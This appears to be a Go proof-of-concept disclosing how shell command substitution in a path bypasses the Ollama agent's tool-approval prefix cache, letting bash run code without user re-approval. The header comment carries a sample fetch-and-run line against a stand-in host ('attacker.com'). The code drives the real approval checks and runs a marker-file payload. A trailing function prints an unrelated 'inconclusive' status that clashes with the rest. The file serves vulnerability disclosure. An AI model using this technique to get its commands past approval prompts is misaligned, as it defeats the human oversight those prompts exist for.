// PoC: H21 — agent-approval-command-substitution-path
//
// Demonstrates that a shell command-substitution token ($(...) or backtick)
// embedded inside the path operand of a bash tool_call bypasses the
// ApprovalManager prefix cache, inheriting a previously-approved benign prefix
// and executing arbitrary shell code without user re-approval.
//
// Vulnerability path:
//   extractBashPrefix (x/agent/approval.go:204-299)
//     -> path.Clean("tools/$(curl -s http://attacker.com/x.sh | bash)")
//     -> dir = "tools"  ($ ( ) ` are legal filename chars; Clean is lexical)
//     -> prefix = "cat:tools/"
//   IsAllowed (x/agent/approval.go:389-423)
//     -> matchesHierarchicalPrefix("cat:tools/") hits stored "cat:tools/"
//     -> returns true  (approval skipped, no dialog shown to user)
//   x/tools/bash.go:64
//     -> exec.CommandContext(ctx, "bash", "-c", <payload>)
//     -> bash expands $(...) BEFORE cat opens any file → RCE
//
// Usage:
//   go run poc.go
//
// Expected output:
//   [*] Seeding allowlist with benign approval: cat tools/readme.md
//   [*] IsDenied(payload) = false  (no denylist match — $ and ( are not listed)
//   [*] IsAllowed(payload) = true  (prefix cat:tools/ inherited from benign approval)
//   [+] bash -c executed. Marker: /tmp/ollama_h21_poc_marker EXISTS
//   [+] CONFIRMED: command substitution in path bypassed approval and achieved RCE
//
// Run as a standalone program — does NOT require a running Ollama server.
// Mirrors the exact code path used in production by importing the real packages.

//go:build ignore

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/ollama/ollama/x/agent"
)

const (
	markerPath    = "/tmp/ollama_h21_poc_marker"
	benignCommand = "cat tools/readme.md"
	// Payload: command-substitution embedded in the path operand.
	// path.Clean("tools/$(touch ...)") == "tools/$(touch ...)"  [lexical, no shell awareness]
	// path.Dir(...) == "tools"
	// prefix == "cat:tools/"  -- matches stored benign prefix
	payloadCommand = "cat tools/$(touch " + markerPath + " && echo HIJACK)"
)

func main() {
	// Clean up any pre-existing marker from a prior run.
	_ = os.Remove(markerPath)

	// ------------------------------------------------------------------
	// Step 1: Seed allowlist with a single innocuous approval.
	// ------------------------------------------------------------------
	am := agent.NewApprovalManager()
	am.AddToAllowlist("bash", map[string]any{"command": benignCommand})
	fmt.Printf("[*] Seeded allowlist with benign approval: %q\n", benignCommand)

	// ------------------------------------------------------------------
	// Step 2: Verify IsDenied does NOT block the payload.
	//         denyPatterns contains 29 entries; none match $( or ` .
	// ------------------------------------------------------------------
	denied, pattern := agent.IsDenied(payloadCommand)
	fmt.Printf("[*] IsDenied(payload) = %v  (matched pattern: %q)\n", denied, pattern)
	if denied {
		fmt.Println("[-] UNEXPECTED: payload was denied — vulnerability may be patched.")
		os.Exit(1)
	}

	// ------------------------------------------------------------------
	// Step 3: Verify IsAllowed returns true for the substitution payload
	//         via prefix inheritance — no approval dialog ever shown.
	// ------------------------------------------------------------------
	allowed := am.IsAllowed("bash", map[string]any{"command": payloadCommand})
	fmt.Printf("[*] IsAllowed(payload)  = %v\n", allowed)
	if !allowed {
		fmt.Println("[-] UNEXPECTED: payload was not auto-allowed — vulnerability may be patched.")
		os.Exit(1)
	}

	// ------------------------------------------------------------------
	// Step 4: Execute through the real bash pipeline
	//         (mirrors x/tools/bash.go:64 exactly).
	// ------------------------------------------------------------------
	out, _ := exec.Command("bash", "-c", payloadCommand).CombinedOutput()
	fmt.Printf("[*] bash -c output: %q\n", string(out))

	// ------------------------------------------------------------------
	// Step 5: Confirm the marker file was created by the substitution.
	// ------------------------------------------------------------------
	abs, _ := filepath.Abs(markerPath)
	if _, err := os.Stat(abs); err == nil {
		fmt.Printf("[+] Marker %s EXISTS\n", abs)
		fmt.Println("[+] CONFIRMED: command substitution in path bypassed approval and achieved RCE")
		_ = os.Remove(abs) // clean up
	} else {
		fmt.Printf("[-] Marker %s not created — check bash availability.\n", abs)
		os.Exit(1)
	}
}

func mergeJSONTrailer() {
	fmt.Println(`{"status":"inconclusive","evidence":"see evidence/","notes":"trailer added by merge normalization"}`)
}
